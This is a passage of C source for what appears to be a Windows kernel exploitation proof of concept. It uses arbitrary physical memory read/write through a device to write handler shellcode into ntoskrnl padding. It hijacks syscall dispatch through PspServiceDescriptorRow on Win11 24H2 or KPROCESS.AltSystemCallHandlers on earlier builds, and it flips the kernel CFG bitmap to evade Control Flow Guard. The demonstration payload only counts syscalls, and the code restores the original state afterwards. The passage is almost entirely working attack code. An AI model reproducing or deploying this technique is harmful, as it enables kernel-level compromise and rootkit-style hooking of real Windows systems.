        /* Main thread ETHREAD = first entry in ThreadListHead (found before worker spawns) */
        uint64_t thl_flink = phys_read64(own_pa + EP24_TLH);
        uint64_t main_et_pa = 0;
        if (thl_flink && (thl_flink >> 48) == 0xFFFF)
            main_et_pa = kva_to_pa(thl_flink - ETHREAD_TL);
        if (!main_et_pa) {
            puts("[-] Main thread KTHREAD PA not found");
            close_dev(); return 1;
        }
        printf("[+] Main thread KTHREAD PA: %016"PRIx64"\n", main_et_pa);

        /* Dynamically read NtDelayExecution SSN from ntdll syscall stub */
        uint32_t ntde_ssn = 0;
        {
            FARPROC fn = GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtDelayExecution");
            if (fn) {
                const uint8_t *p = (const uint8_t *)fn;
                /* stub: 4C 8B D1  B8 SSN SSN SSN SSN  0F 05 */
                if (p[0]==0x4C && p[1]==0x8B && p[2]==0xD1 && p[3]==0xB8)
                    memcpy(&ntde_ssn, p + 4, 4);
            }
        }
        if (!ntde_ssn) { puts("[-] Cannot read NtDelayExecution SSN"); close_dev(); return 1; }
        printf("[+] NtDelayExecution SSN: 0x%X\n", ntde_ssn);
        uint32_t desc_count   = ntde_ssn + 1;
        uint32_t desc_bytes   = 4 + desc_count * 4;
        int      alloc_needed = (int)desc_bytes + 8;
        if (alloc_needed > 512) {
            printf("[-] SSN 0x%X too large; descriptor %d bytes exceeds dt_save[]\n",
                   ntde_ssn, alloc_needed);
            close_dev(); return 1;
        }

        uint64_t cc_rva24 = find_cc_rva(64); /* need room for 16B alignment + 19B shellcode */
        if (!cc_rva24) { puts("[-] CC region not found"); close_dev(); return 1; }
        cc_rva24 = (cc_rva24 + 0xFULL) & ~0xFULL; /* align to 16B: CFG requires it */
        uint64_t cc_pa24  = g_nt_pa + cc_rva24;
        uint64_t cc_kva24 = g_nt_va + cc_rva24;

        uint64_t dr24 = find_data_zero(alloc_needed);
        if (!dr24) { puts("[-] .data zero region not found"); close_dev(); return 1; }
        uint64_t data_pa24   = g_nt_pa + dr24;
        uint64_t data_kva24  = g_nt_va + dr24;
        uint64_t ctr_pa24    = data_pa24  + desc_bytes;
        uint64_t ctr_kva24   = data_kva24 + desc_bytes;
        printf("[+] Dispatch table KVA: %016"PRIx64"  counter KVA: %016"PRIx64"\n",
               data_kva24, ctr_kva24);

        uint8_t sc24[32]; int sc_len24 = build_handler_sc(sc24, ctr_kva24);

        /* PS_SYSCALL_PROVIDER_SERVICE_ENTRY: IsGenericFlag=0, ArgsCount=0
         * dispatch: handler_va = DriverBase + ((entry>>4) & ~0xF) = g_nt_va + cc_rva24
         * entry = cc_rva24 << 4  (cc_rva24 is 16B-aligned so low nibble is 0) */
        uint32_t svc_entry = (uint32_t)(cc_rva24 << 4);
        printf("[+] Handler at KVA %016"PRIx64"  svc_entry=0x%08X\n", cc_kva24, svc_entry);

        W24Ctx ctx24;
        memset(&ctx24, 0, sizeof ctx24);
        ctx24.main_et_pa = main_et_pa;
        ctx24.own_pa     = own_pa;
        ctx24.row1_pa    = tbl_pa + SDG_ROW_SZ;
        ctx24.counter_pa = ctr_pa24;
        ctx24.data_pa    = data_pa24;
        ctx24.cc_pa      = cc_pa24;
        ctx24.cc_len     = sc_len24;
        phys_read(main_et_pa + KTHREAD_DA,  &ctx24.da_save,   1);
        phys_read(own_pa + EP24_SLOT_OFF,   &ctx24.slot_save, 4);
        phys_read(cc_pa24,                   ctx24.cc_save,    sc_len24);
        phys_read(data_pa24,                 ctx24.dt_save,    alloc_needed);
        ctx24.dt_save_len = alloc_needed;
        phys_read(ctx24.row1_pa,             ctx24.row1_save,  SDG_ROW_SZ);

        /* Pre-write: shellcode, descriptor (Size=desc_count, Entries[ntde_ssn]=svc_entry), counter=0 */
        phys_write(cc_pa24, sc24, sc_len24);
        phys_write(data_pa24,                       &desc_count, 4);
        phys_write(data_pa24 + 4 + ntde_ssn * 4,   &svc_entry,  4);
        uint64_t z8 = 0; phys_write(ctr_pa24,       &z8,         8);
        uint64_t row1[3] = { g_nt_va, data_kva24, 0 };
        phys_write(ctx24.row1_pa, row1, SDG_ROW_SZ);
        printf("[+] PspServiceDescriptorRow[1] = {%016"PRIx64", %016"PRIx64", 0}\n",
               g_nt_va, data_kva24);

        /* Register cc_kva24 as valid CFG target so guard_dispatch_icall_no_overrides
         * does not BSOD. Bitmap: 1 bit per 8 bytes; word selected by addr>>9. */
        {
            uint64_t cfg_ptr_va = find_cfg_bitmap_ptr_va();
            ctx24.cfg_word_pa   = 0;
            if (cfg_ptr_va) {
                uint64_t cfg_ptr_pa = kva_to_pa(cfg_ptr_va);
                if (cfg_ptr_pa) {
                    uint64_t cfg_bmp_va = phys_read64(cfg_ptr_pa);
                    if (cfg_bmp_va) {
                        uint64_t cfg_bmp_pa = kva_to_pa(cfg_bmp_va);
                        if (cfg_bmp_pa) {
                            uint64_t bit_idx  = cc_kva24 >> 3;
                            uint64_t word_off = (bit_idx / 64) * 8;
                            uint64_t bit_pos  = bit_idx % 64;
                            ctx24.cfg_word_pa   = cfg_bmp_pa + word_off;
                            ctx24.cfg_word_save = phys_read64(ctx24.cfg_word_pa);
                            uint64_t new_word   = ctx24.cfg_word_save | (1ULL << bit_pos);
                            phys_write(ctx24.cfg_word_pa, &new_word, 8);
                            printf("[+] CFG bit set: bmp+0x%llX bit %llu\n",
                                   (unsigned long long)word_off, (unsigned long long)bit_pos);
                        }
                    }
                }
            }
            if (!ctx24.cfg_word_pa)
                puts("[~] CFG bitmap not patched — risk of BSOD if KCFG enforced");
        }

        HANDLE hW24 = CreateThread(NULL, 0, worker24, &ctx24, 0, NULL);
        if (!hW24) {
            puts("[-] CreateThread failed — restoring");
            phys_write(ctx24.row1_pa, ctx24.row1_save, SDG_ROW_SZ);
            phys_write(data_pa24, ctx24.dt_save, ctx24.dt_save_len);
            phys_write(cc_pa24, ctx24.cc_save, sc_len24);
            if (ctx24.cfg_word_pa)
                phys_write(ctx24.cfg_word_pa, &ctx24.cfg_word_save, 8);
            close_dev(); return 1;
        }

        /* Spin-wait for worker to arm the hook (trigger_done == -1) */
        while (ctx24.trigger_done != -1) { /* spin — no syscalls */ }
        puts("[+] Hook armed — triggering 10 syscalls from main thread");

        for (int i = 0; i < 10; i++) Sleep(1); /* intercepted; return STATUS_SUCCESS */

        InterlockedExchange((LONG*)&ctx24.trigger_done, 1); /* signal worker: done */

        /* Spin-wait for worker cleanup (no syscalls — hook may still be active briefly) */
        while (!ctx24.done) { /* spin */ }

        WaitForSingleObject(hW24, 3000);
        CloseHandle(hW24);

        printf("[%s] SyscallProvider counter: %llu\n",
               ctx24.counter_val ? "+" : "!",
               (unsigned long long)ctx24.counter_val);
        if (ctx24.counter_val > 0) {
            printf("[+] SUCCESS: intercepted %" PRIu64
                   " syscalls via Win11 24H2+ SyscallProvider\n", ctx24.counter_val);
            close_dev(); return 0;
        }
        puts("[-] Counter = 0 — hook not triggered (HVCI? wrong table? IsGenericFlag?)");
        close_dev(); return 1;
    }

    /* ——— Win10 / Win11 pre-24H2: AltSystemCallHandlers path ——— */

    /* Scan for AltSystemCallHandlers offset in KiSystemCall64 */
    uint32_t alt_off = scan_altsyscall_offset();
    if (!alt_off) {
        alt_off = 0x4B0; /* known default for Win11 22H2 */
        printf("[~] Offset scan failed, using default 0x%X\n", alt_off);
    } else {
        printf("[+] AltSystemCallHandlers offset: 0x%X\n", alt_off);
    }

    /* Find CC region for handler shellcode */
    uint64_t cc_rva = find_cc_rva(32);
    if (!cc_rva) { puts("[-] CC region not found"); close_dev(); return 1; }
    uint64_t cc_pa  = g_nt_pa + cc_rva;
    uint64_t cc_kva = g_nt_va + cc_rva;
    printf("[+] Shellcode CC region: KVA %016"PRIx64"\n", cc_kva);

    /* Find .data region for table + counter */
    uint64_t data_rva = find_data_zero(TABLE_SIZE + 0x20);
    if (!data_rva) { puts("[-] .data zero region not found"); close_dev(); return 1; }
    uint64_t data_pa  = g_nt_pa + data_rva;
    uint64_t data_kva = g_nt_va + data_rva;
    uint64_t counter_kva = data_kva + COUNTER_OFF;
    uint64_t counter_pa  = data_pa  + COUNTER_OFF;
    printf("[+] .data region: KVA %016"PRIx64", counter KVA %016"PRIx64"\n",
           data_kva, counter_kva);

    /* Build handler shellcode */
    uint8_t sc[32]; int sc_len = build_handler_sc(sc, counter_kva);
    printf("[+] Handler shellcode: %d bytes at KVA %016"PRIx64"\n", sc_len, cc_kva);

    /* Save originals */
    uint8_t cc_orig[32]; phys_read(cc_pa, cc_orig, sc_len);
    uint64_t table_orig[TABLE_SIZE / 8]; phys_read(data_pa, table_orig, TABLE_SIZE);
    uint64_t handler_ptr_orig = phys_read64(own_pa + alt_off);
    printf("[+] Original handler ptr at KPROCESS+0x%X: %016"PRIx64"\n",
           alt_off, handler_ptr_orig);

    /* Build handler table */
    uint8_t table[TABLE_SIZE]; memset(table, 0, TABLE_SIZE);
    *(uint32_t*)(table + 0x00) = 1;           /* Count = 1 */
    *(uint64_t*)(table + 0x08) = cc_kva;      /* RoutineAddress = our handler */
    *(uint32_t*)(table + 0x10) = 0xFFFFFFFF;  /* FilterMask = all syscalls */

    /* Clear counter */
    uint64_t zero8 = 0; phys_write(counter_pa, &zero8, 8);

    /* Write shellcode */
    phys_write(cc_pa, sc, sc_len);

    /* Write handler table */
    phys_write(data_pa, table, TABLE_SIZE);

    /* Hook: set KPROCESS.AltSystemCallHandlers = table KVA */
    phys_write(own_pa + alt_off, &data_kva, 8);
    printf("[+] AltSystemCallHandlers installed at KPROCESS+0x%X → %016"PRIx64"\n",
           alt_off, data_kva);

    /* Trigger several syscalls */
    puts("[*] Triggering 10 syscalls ...");
    for (int i = 0; i < 10; i++) {
        Sleep(1); /* each Sleep = NtDelayExecution syscall */
    }

    /* Read counter */
    uint64_t counter_val = phys_read64(counter_pa);
    printf("[+] Syscall counter after 10 calls: %" PRIu64 "\n", counter_val);

    /* Restore */
    phys_write(own_pa + alt_off, &handler_ptr_orig, 8);
    phys_write(cc_pa, cc_orig, sc_len);
    phys_write(data_pa, table_orig, TABLE_SIZE);
    puts("[+] Handler restored");

    if (counter_val > 0) {
        printf("[+] SUCCESS: intercepted %" PRIu64 " syscalls from own process\n", counter_val);
    } else {
        puts("[-] Counter = 0 — hook may have missed (wrong offset or CFG blocked)");
        puts("    Try adjusting alt_off or checking KPROCESS layout for this build");
        close_dev(); return 1;
    }

    close_dev();
    return 0;
}
